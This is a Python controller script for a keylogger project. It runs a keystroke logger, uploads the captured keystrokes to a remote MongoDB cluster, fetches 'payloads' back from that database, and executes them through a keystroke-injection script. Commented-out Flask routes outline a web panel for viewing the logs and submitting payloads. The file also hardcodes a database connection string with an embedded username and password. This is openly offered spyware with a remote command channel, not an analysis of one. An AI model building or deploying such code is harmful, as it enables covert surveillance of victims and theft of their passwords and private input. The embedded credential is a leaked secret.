import threading
import subprocess
import os
import sys
import time
import datetime
import pymongo

# Get the directory of weblogger.py
current_directory = os.path.dirname(os.path.realpath(__file__))

# Full paths of keylogger.py and mailink.py
keylogger_path = os.path.join(current_directory, "keylogger.py")
pyDucky_path = os.path.join(current_directory, "pyDucky.py")
mongoSave_path = os.path.join(current_directory, "mongo-save.py")
mongoRetrieve_path = os.path.join(current_directory, "mongo-retrieve.py")

logs_file = 'keylogs.txt'
keylogs = []  # List to store keylogs

# MongoDB KeyLogger connection
client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
db = client["keylogger"]
keylogs_collection = db["keylog"]
payload_collection = db["payload"]


# @app.route('/')
# def home():
#     formatted_logs = format_logs(keylogs)
#     return render_template('index.html', logs=formatted_logs)

# @app.route('/')
# def home():
#     # Fetch keystrokes and visited sites from MongoDB
#     logs = site_logs_collection.find({})
    
#     formatted_site_logs = [f"<{log['site']}> [{log['timestamp']}] > {log['keystroke']}" for log in logs]


#     formatted_logs = format_logs(keylogs)
    
#     return render_template('index.html', logs=formatted_logs,site_logs=formatted_site_logs)


# @app.route('/payload', methods=['GET', 'POST'])
# def payload():
#     if request.method == 'POST':
#         payload_data = request.form['payload']
#         save_payload(payload_data)
#         execute_payload_script()
#         return redirect(url_for('home'))
#     return render_template('index.html')

def save_payload():
    subprocess.run(['python', mongoRetrieve_path])
    time.sleep(10)  # Update every 10 seconds

def execute_payload_script():
    subprocess.run(['python', pyDucky_path])

def run_keylogger():
    subprocess.run(['python', keylogger_path])

def save_keylogs():
    subprocess.run(['python', mongoSave_path])
    execute_payload_script()
    time.sleep(10)  # Update every 10 seconds
    
# def format_logs(logs):
#     formatted_logs = []
#     for log in logs:
#         formatted_log = ''
#         parts = log.split('>')
#         if len(parts) >= 2:
#             timestamp, action = parts[0], parts[1].strip()
#             formatted_log = f"{timestamp}> {action}"
#         else:
#             formatted_log = log.strip()
#         formatted_logs.append(formatted_log)
#     return formatted_logs

# def update_logs():
#     global keylogs
#     if os.path.exists(logs_file):
#         os.remove(logs_file)  # Delete the previous keylogs.txt file
#     if not os.path.exists(logs_file):
#         with open(logs_file, 'w') as file:
#             pass  # Create an empty file
#     while True:
#         with open(logs_file, 'r') as file:
#             lines = file.readlines()  # Read lines from file
#         formatted_logs = []
#         for line in lines:
#             current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
#             formatted_log = f"{current_time}> {line.strip()}"  # Add timestamp to each log line
#             formatted_logs.append(formatted_log)
#         keylogs = formatted_logs  # Update keylogs with formatted logs
#         time.sleep(10)  # Update every 10 seconds


if __name__ == '__main__':
    t1 = threading.Thread(target=run_keylogger)
    t2 = threading.Thread(target=save_keylogs)
    t3 = threading.Thread(target=save_payload)

    t1.start()
    t2.start()
    t3.start()


